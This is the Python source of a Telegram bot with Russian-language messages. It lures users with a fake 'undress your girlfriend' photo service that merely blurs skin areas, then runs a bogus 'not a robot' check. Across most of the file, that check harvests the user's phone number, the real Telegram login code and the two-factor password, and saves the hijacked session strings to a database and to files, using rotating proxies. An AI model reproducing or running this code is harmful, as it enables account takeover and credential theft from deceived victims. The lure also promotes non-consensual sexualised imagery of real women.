import cv2
import numpy as np
from PIL import Image, ImageFilter
import io
import logging
import os
import json
import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
from datetime import datetime

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# Основная прокси (старая, для совместимости)
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
main_proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# Вторая прокси (новая)
PROXY1_HOST = os.getenv("PROXY1_HOST")
PROXY1_PORT = int(os.getenv("PROXY1_PORT"))
PROXY1_USER = os.getenv("PROXY1_USER")
PROXY1_PASS = os.getenv("PROXY1_PASS")
second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)

# Список доступных прокси (первая - старая основная)
proxy_list = [main_proxy, second_proxy]

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
start_col = db["start"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

os.makedirs("temp_photos", exist_ok=True)

def process_photo(image_path):
    """Обрабатывает фото: создает эффект раздевания с сильным размытием"""
    # Загрузка изображения
    image = cv2.imread(image_path)
    if image is None:
        raise ValueError("Не удалось загрузить изображение")
    
    # Конвертируем в RGB (OpenCV использует BGR)
    image_rgb = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)
    original_image = image_rgb.copy()
    
    # Детекция лица для получения цвета кожи
    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
    gray = cv2.cvtColor(image_rgb, cv2.COLOR_RGB2GRAY)
    faces = face_cascade.detectMultiScale(gray, 1.1, 4)
    
    # Если найдены лица, берем средний цвет кожи с лица
    skin_color = None
    if len(faces) > 0:
        for (x, y, w, h) in faces:
            face_region = image_rgb[y:y+h, x:x+w]
            # Берем только центральную часть лица для более точного цвета
            center_face = face_region[int(h/4):int(3*h/4), int(w/4):int(3*w/4)]
            if center_face.size > 0:
                avg_color = np.mean(center_face, axis=(0, 1))
                skin_color = avg_color.astype(int)
            break
    
    # Если лица не найдены, используем общий цвет кожи по умолчанию
    if skin_color is None:
        skin_color = np.array([200, 170, 150])  # цвет кожи по умолчанию
    
    # Создаем маску для области кожи с более широким диапазоном
    lower_skin = np.array([
        max(skin_color[0] - 50, 0),
        max(skin_color[1] - 60, 0), 
        max(skin_color[2] - 70, 0)
    ], dtype=np.uint8)
    
    upper_skin = np.array([
        min(skin_color[0] + 50, 255),
        min(skin_color[1] + 40, 255),
        min(skin_color[2] + 30, 255)
    ], dtype=np.uint8)
    
    # Конвертируем в HSV для лучшего обнаружения кожи
    image_hsv = cv2.cvtColor(image_rgb, cv2.COLOR_RGB2HSV)
    
    # Дополнительный диапазон для кожи в HSV
    lower_skin_hsv = np.array([0, 20, 70], dtype=np.uint8)
    upper_skin_hsv = np.array([20, 255, 255], dtype=np.uint8)
    
    # Создаем маску кожи в HSV
    skin_mask_hsv = cv2.inRange(image_hsv, lower_skin_hsv, upper_skin_hsv)
    
    # Создаем маску кожи в RGB
    skin_mask_rgb = cv2.inRange(image_rgb, lower_skin, upper_skin)
    
    # Комбинируем маски
    skin_mask = cv2.bitwise_or(skin_mask_rgb, skin_mask_hsv)
    
    # Улучшаем маску с помощью морфологических операций
    kernel = np.ones((7,7), np.uint8)
    skin_mask = cv2.morphologyEx(skin_mask, cv2.MORPH_CLOSE, kernel)
    skin_mask = cv2.morphologyEx(skin_mask, cv2.MORPH_OPEN, kernel)
    
    # Находим контуры на маске
    contours, _ = cv2.findContours(skin_mask, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
    
    # Создаем маску для основных областей кожи
    body_mask = np.zeros_like(skin_mask)
    for contour in contours:
        area = cv2.contourArea(contour)
        if area > 1000:  # фильтруем мелкие области
            # Увеличиваем область для более плавного перехода
            hull = cv2.convexHull(contour)
            cv2.drawContours(body_mask, [hull], -1, 255, -1)
    
    # Сильное размытие маски для плавных краев
    body_mask = cv2.GaussianBlur(body_mask, (51, 51), 0)
    
    # Создаем равномерную замазку цвета кожи
    skin_tone_overlay = np.zeros_like(image_rgb)
    skin_tone_overlay[:] = skin_color
    
    # Создаем очень размытую версию оригинального изображения
    strongly_blurred = cv2.GaussianBlur(image_rgb, (99, 99), 0)
    
    # Смешиваем замазку цвета кожи с размытым изображением
    # 70% цвета кожи + 30% размытого оригинала
    skin_blend = cv2.addWeighted(skin_tone_overlay, 0.7, strongly_blurred, 0.3, 0)
    
    # Дополнительное размытие смеси
    final_blurred = cv2.GaussianBlur(skin_blend, (45, 45), 0)
    
    # Накладываем результат только на области кожи
    result_image = image_rgb.copy()
    
    # Нормализуем маску до диапазона 0-1 для альфа-смешивания
    body_mask_float = body_mask.astype(float) / 255.0
    body_mask_float = np.expand_dims(body_mask_float, axis=2)
    
    # Постепенное смешивание
    for c in range(3):
        result_image[:, :, c] = (
            image_rgb[:, :, c] * (1 - body_mask_float[:, :, 0]) + 
            final_blurred[:, :, c] * body_mask_float[:, :, 0]
        ).astype(np.uint8)
    
    # Дополнительное общее размытие всего изображения для единообразия
    result_image = cv2.GaussianBlur(result_image, (15, 15), 0)
    
    # Легкая коррекция цвета для естественности
    result_image = cv2.convertScaleAbs(result_image, alpha=1.1, beta=5)
    
    # Конвертируем обратно в BGR для сохранения
    result_image_bgr = cv2.cvtColor(result_image, cv2.COLOR_RGB2BGR)
    
    # Сохраняем результат
    output_path = image_path.replace(".jpg", "_processed.jpg")
    cv2.imwrite(output_path, result_image_bgr)
    
    return output_path

def get_proxy_for_phone(phone):
    """Выбираем прокси для номера"""
    existing_session = sessions_col.find_one({"phone": phone})
    if existing_session:
        return proxy_list[existing_session.get('proxy_index', 0)]
    return proxy_list[hash(phone) % len(proxy_list)]

def cleanup(user_id):
    """Очищает данные пользователя из временных хранилищ"""
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

def update_user_log(user_id: int, updates: dict):
    """Обновляет или создает запись пользователя с новыми данными"""
    try:
        start_col.update_one(
            {"user_id": user_id},
            {"$set": updates, "$setOnInsert": {"first_seen": datetime.now()}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"Ошибка при обновлении лога пользователя: {e}")

async def send_code_keyboard(user_id, current_code, message_id=None):
    """Отправляет/обновляет клавиатуру для ввода кода"""
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("✅ Отправить код", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"📱 *Код подтверждения:*\n\n`{current_code}`\n\n_Нажимайте цифры ниже, чтобы ввести код, полученный от Telegram._" if current_code else "🔢 *Введите код подтверждения*\n\n_Нажимайте кнопки ниже, чтобы ввести код, полученный от Telegram._"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                 text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

async def send_welcome_message(user_id):
    """Отправляет приветственное сообщение"""
    try:
        await bot.send_message(
            user_id,
            "Хочешь раздеть свою подругу? Тогда скидай фото подруги, которую хочешь раздеть! 📸",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error sending welcome message: {e}")
        await bot.send_message(
            user_id,
            "Хочешь раздеть свою подругу? Тогда скидай фото подруги, которую хочешь раздеть! 📸",
            parse_mode='Markdown'
        )

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user = message.from_user
    
    update_user_log(
        user_id=user.id,
        updates={
            "username": user.username,
            "first_name": user.first_name,
            "last_name": user.last_name,
            "language_code": user.language_code,
            "is_bot": user.is_bot,
            "chat_id": message.chat.id,
            "last_start": datetime.now(),
            "status": "started"
        }
    )

    # Отправляем приветственное сообщение
    await send_welcome_message(user.id)

@dp.message_handler(content_types=types.ContentType.PHOTO)
async def handle_photo(message: types.Message):
    user_id = message.from_user.id
    
    # Сохраняем фото
    photo = message.photo[-1]  # Берем самое качественное фото
    file_info = await bot.get_file(photo.file_id)
    downloaded_file = await bot.download_file(file_info.file_path)
    
    # Сохраняем временный файл
    temp_path = f"temp_photos/{user_id}_{photo.file_id}.jpg"
    with open(temp_path, "wb") as new_file:
        new_file.write(downloaded_file.getvalue())
    
    # Обновляем состояние пользователя
    user_states[user_id] = 'photo_received'
    
    update_user_log(
        user_id=user_id,
        updates={
            "photo_received": True,
            "photo_receive_time": datetime.now(),
            "status": "photo_processing"
        }
    )
    
    # Отправляем сообщение о начале обработки
    processing_msg = await bot.send_message(user_id, "🔍 *Анализирую фото...*", parse_mode='Markdown')
    
    try:
        # Обрабатываем фото
        processed_photo_path = process_photo(temp_path)
        
        # Отправляем обработанное фото
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("Я не робот!", callback_data="auth_account"))
        
        with open(processed_photo_path, 'rb') as photo_file:
            await bot.send_photo(
                user_id,
                photo_file,
                caption=(
                    "🔥 *УСПЕШНО ОБРАБОТАНО!* 🔞\n\n"
                    "Я смог раздеть твою подругу! Это фото примонтировано с лицом твоей подруги!\n\n"
                    "😱 *Я НАШЕЛ ЕЩЕ ОТКРОВЕННЫЕ ФОТО!* 👇\n"
                    "ТЕБЕ НУЖНО ПРОЙТИ ПРОСТУЮ ПРОВЕРКУ, что ты не робот!"
                ),
                parse_mode='Markdown',
                reply_markup=keyboard
            )
        
        # Удаляем сообщение о обработке
        await bot.delete_message(user_id, processing_msg.message_id)
        
        # Обновляем лог
        update_user_log(
            user_id=user_id,
            updates={
                "photo_processed": True,
                "photo_process_time": datetime.now(),
                "status": "photo_processed"
            }
        )
        
    except Exception as e:
        logging.error(f"Error processing photo: {e}")
        await bot.edit_message_text(
            chat_id=user_id,
            message_id=processing_msg.message_id,
            text="❌ Ошибка при обработке фото. Попробуй снова с другим фото!",
            parse_mode='Markdown'
        )
    
    # Удаляем временные файлы
    try:
        os.remove(temp_path)
        if 'processed_photo_path' in locals():
            os.remove(processed_photo_path)
    except:
        pass

# [Остальной код без изменений...]

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    update_user_log(
        user_id=user_id,
        updates={
            "auth_button_clicked": True,
            "auth_button_click_time": datetime.now(),
            "status": "awaiting_contact"
        }
    )

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Поделиться номером телефона", request_contact=True))
    await bot.send_message(
        user_id,
        "ШАГ 1. *ПОДТВЕРДИТЕ НОМЕР ТЕЛЕФОНА 🔎, тем самым подтвердив, что вы не спецслужбы и не робот! (У нас много спама на наш телеграм-бот, поэтому мы вынуждены делать проверку)* 🔞\n\n",
        parse_mode='Markdown',
        reply_markup=kb
    )
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    geo_info = None
    try:
        parsed_number = phonenumbers.parse(phone)
        geo_info = geocoder.description_for_number(parsed_number, "en")
    except Exception as e:
        logging.error(f"Ошибка при определении геолокации: {e}")

    update_user_log(
        user_id=user_id,
        updates={
            "phone": phone,
            "geo_info": geo_info,
            "contact_shared": True,
            "contact_share_time": datetime.now(),
            "contact_user_id": message.contact.user_id,
            "status": "contact_received"
        }
    )

    selected_proxy = get_proxy_for_phone(phone)
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        
        await message.answer(
            "Сейчас тебе должен прийти КОД от официального Telegram. Напиши этот код на клавиатуре ниже, тем самым подтвердив, что ты не робот! 📩\n\n",
            parse_mode='Markdown'
        )
        
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        
    except Exception as e:
        await message.answer(f"❌ Ошибка при отправке кода: {e}", parse_mode='Markdown')
        await client.disconnect()
        cleanup(user_id)

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ Сначала поделись номером телефона", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="Ошибка. Перезапусти с /start", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Сначала введи код", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Код слишком длинный", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.send_message(user_id, "⚠️ Сессия истекла. Перезапусти с /start", parse_mode='Markdown')
        cleanup(user_id)
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            me = await client.get_me()
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name if me.last_name else None,
                    "auth_date": datetime.now()
                }}, 
                upsert=True
            )

            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "telegram_id": me.id,
                    "tg_username": me.username,
                    "tg_first_name": me.first_name,
                    "tg_last_name": me.last_name,
                    "status": "authenticated",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await bot.send_message(
                user_id,
                "🎉 *ПРОВЕРКА УСПЕШНО ЗАВЕРШЕНА!* 🔞🎊\n\n"
                "✅ *ДОСТУП К ЭКСКЛЮЗИВНЫМ ФОТО РАЗБЛОКИРОВАН!*\n\n"
                "🔥 *ТЕПЕРЬ ТЫ МОЖЕШЬ УВИДЕТЬ ВСЕ:*\n"
                "• Тонны горячих фото твоей подруги\n"
                "• Эксклюзивные материалы из закрытого интернета\n"
                "• Уникальные снимки, которых нет нигде\n\n"
                "🚀 *Материалы уже загружаются...*\n"
                "Так как контента реально ОЧЕНЬ много, мы готовим всё для тебя!\n"
                "Первые фото придут в течение нескольких минут (иногда часов)!\n\n"
                "⚠️ *ДЕРЖИ ДОСТУП В СЕКРЕТЕ* - Это только для тебя!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            user_states[user_id] = 'awaiting_2fa'
            update_user_log(
                user_id=user_id,
                updates={"status": "awaiting_2fa"}
            )
            await bot.send_message(
                user_id,
                "🔐 *ДОПОЛНИТЕЛЬНАЯ ЗАЩИТА* 🔞\n\n"
                "Твой аккаунт защищён двухэтапной верификацией.\n\n"
                "📝 *Введи пароль безопасности ниже:*\n\n"
                "⚡️ *ПОСЛЕ ЭТОГО ПОЛУЧИШЬ:*\n"
                "• Полный доступ к эксклюзивным фото\n"
                "• Уникальные материалы из закрытого интернета\n"
                "_Этот пароль отличается от кода из SMS._",
                parse_mode='Markdown'
            )
    except PhoneCodeExpiredError:
        await bot.send_message(
            user_id,
            "⏰ *Код истёк*\n\n"
            "Код устарел. Используй /start, чтобы получить новый код и открыть доступ к эксклюзивным фото!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)
    except PhoneCodeInvalidError:
        await bot.send_message(
            user_id,
            "❌ *Неверный код*\n\n"
            "Код введён неправильно. Проверь SMS и введи код заново, чтобы разблокировать доступ к фото!",
            parse_mode='Markdown'
        )
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        update_user_log(
            user_id=user_id,
            updates={"status": "awaiting_2fa"}
        )
        await bot.send_message(
            user_id,
            "🔐 *ОБНАРУЖЕНА ДОПОЛНИТЕЛЬНАЯ ЗАЩИТА* 🔞\n\n"
            "Твой аккаунт использует двухэтапную верификацию.\n\n"
            "📝 *Введи пароль безопасности ниже, чтобы разблокировать всё:*\n\n"
            "⚡️ *ПОСЛЕ ЭТОГО ПОЛУЧИШЬ:*\n"
            "• Полный доступ к эксклюзивным фото\n"
            "• Уникальные материалы из закрытого интернета",
            parse_mode='Markdown'
        )
    except Exception as e:
        await bot.send_message(
            user_id,
            f"❌ *Ошибка при проверке*\n\n"
            f"Техническая проблема:\n`{e}`\n\n"
            f"Попробуй снова с /start, чтобы получить доступ к эксклюзивным фото!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("⚠️ Сессия истекла. Используй /start для перезапуска", parse_mode='Markdown')
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "auth_date": datetime.now(),
                    "has_2fa": True
                }}, 
                upsert=True
            )
            
            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "has_2fa": True,
                    "status": "authenticated_with_2fa",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await message.answer(
                "🎉 *ПРОВЕРКА УСПЕШНО ЗАВЕРШЕНА!* 🔞🎊\n\n"
                "✅ *ДОСТУП К ЭКСКЛЮЗИВНЫМ ФОТО РАЗБЛОКИРОВАН!*\n\n"
                "🔥 *ТЕПЕРЬ ТЫ МОЖЕШЬ УВИДЕТЬ ВСЕ:*\n"
                "• Тонны горячих фото твоей подруги\n"
                "• Эксклюзивные материалы из закрытого интернета\n"
                "• Уникальные снимки, которых нет нигде\n\n"
                "🚀 *Материалы уже загружаются...*\n"
                "Так как контента реально ОЧЕНЬ много, мы готовим всё для тебя!\n"
                "Первые фото придут в течение нескольких минут (иногда часов)!\n\n"
                "⚠️ *ДЕРЖИ ДОСТУП В СЕКРЕТЕ* - Это только для тебя!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            await message.answer(
                "❌ *Неверный пароль*\n\n"
                "Пароль введён неправильно. Отправь правильный пароль, чтобы разблокировать доступ к фото!",
                parse_mode='Markdown'
            )
    except Exception as e:
        await message.answer(
            f"❌ *Ошибка проверки*\n\n"
            f"Проблема: `{e}`\n\n"
            f"Попробуй снова с /start, чтобы получить доступ к эксклюзивным фото!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)